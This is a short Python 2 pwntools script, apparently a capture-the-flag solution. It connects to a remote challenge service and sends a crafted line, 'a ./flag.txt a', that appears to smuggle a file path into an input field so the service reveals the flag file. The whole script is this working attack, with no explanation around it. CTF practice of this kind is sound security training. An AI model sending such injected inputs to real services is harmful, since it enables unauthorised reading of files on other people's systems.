#!/usr/bin/env python2

from pwn import *
import sys

context.log_level = 'DEBUG'

loc = sys.argv[1] if len(sys.argv) == 2 else 'localhost:5000'
print('using remote {}'.format(loc))

netloc, port = loc.split(':')
p = remote(netloc, int(port))
p.sendline('a ./flag.txt a\r')
p.sendline('\r')
p.sendline('\r')

p.recvall()
